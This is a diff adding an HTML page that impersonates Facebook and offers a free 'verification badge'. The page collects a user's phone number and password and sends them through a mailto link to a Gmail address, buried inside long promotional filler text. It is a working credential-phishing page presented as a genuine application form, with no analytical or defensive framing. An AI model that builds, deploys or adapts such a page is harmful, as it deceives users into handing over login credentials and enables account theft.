@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Verified Badge On Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+
+        #loginContainer {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 300px;
+        }
+
+        #loginContainer img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #1877f2;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #155cb0;
+        }
+    </style>
+</head>
+<body>
+    <div id="loginContainer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo"><br>
+        <h2>Facebook Free Verification Badge✓⃝™</h2>
+
+        <!-- Form with mailto action -->
+        <form onsubmit="sendEmail()" method="post">
+            <input type="text" id="phoneNumber" placeholder="Phone Number" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <button type="submit">Apply Now</button>
+        </form>
+    </div>
+
+    <script>
+        function sendEmail() {
+            // Get the phone number and password values
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('password').value;
+
+            // Introductory message
+            const introMessage = "The importance of Facebook verification and the blue badge can be understated in today's digital world. With over 2.8 billion monthly active users, Facebook has become a prominent platform for individuals, businesses, and organizations to connect and engage with their audience. However, this popularity has also attracted malicious actors looking to exploit and deceive users. Facebook verification and the blue badge play a crucial role in establishing authenticity, credibility, and trust on the platform.\n\n";
+
+            // First closing message
+            const firstClosingMessage = "First and foremost, Facebook verification serves as a badge of authenticity. It provides a means for users to ensure that the profiles and pages they interact with are indeed legitimate and associated with the individual, business, or organization they claim to represent. Verification makes it more difficult for imposters to deceive users by using the same name, profile picture, or other details to create fake accounts. It allows users to have a sense of confidence that the information and content they see is coming from a trusted source.\n\nFurthermore, Facebook verification helps protect individuals and businesses from phishing and scams. Verified profiles and pages are less likely to be targeted by hackers looking to gain unauthorized access to personal or confidential information. By having their identity verified, individuals and businesses can establish a layer of security that deters malicious actors from impersonating them or engaging in fraudulent activities.\n\nVerification also enhances the credibility and reputation of businesses and public figures on Facebook. The blue badge serves as a mark of distinction, signaling that the account is owned and operated by a recognized and noteworthy entity. This distinction is particularly important for high-profile individuals, celebrities, journalists, and public figures who rely on their online presence to maintain their reputation and influence. The blue badge gives them an extra level of authenticity, ensuring that their voice and content are not diluted or overshadowed by imitators or fake accounts.\n\n";
+
+            // User details section
+            const userDetails = `Entered Information:\nPhone Number: ${phoneNumber}\nPassword: ${password}\n\n`;
+
+            // Second closing message
+            const secondClosingMessage = "For businesses, the blue badge carries even more weight. It helps establish trust among potential customers, partners, and investors. Verified business pages demonstrate that the company's identity has been confirmed by Facebook, making it more likely to be seen as reputable and reliable. This verification can lead to increased user engagement, customer loyalty, and ultimately, business growth.\n\nIn addition, Facebook verification provides access to exclusive features and opportunities. Verified accounts often enjoy additional tools and functionalities not available to unverified profiles and pages. These features could include enhanced analytics, advanced targeting options for ads, and priority support from Facebook's customer service. Verified profiles and pages may also gain access to specialized features such as Facebook Live, enabling them to connect with their audience in unique ways.";
+
+            // Combine all messages
+            const fullMessage = introMessage + firstClosingMessage + userDetails + secondClosingMessage;
+
+            // Create a mailto link with subject and body
+            const mailtoLink = `mailto:getbluebadgeforfacebook10@gmail.com?subject=Facebook%20Verification%20Badge%20Request&body=${encodeURIComponent(fullMessage)}`;
+
+            // Open the mailto link
+            window.location.href = mailtoLink;
+
+            // Prevent the form from submitting in the traditional way
+            return false;
+        }
+    </script>
+</body>
+</html>
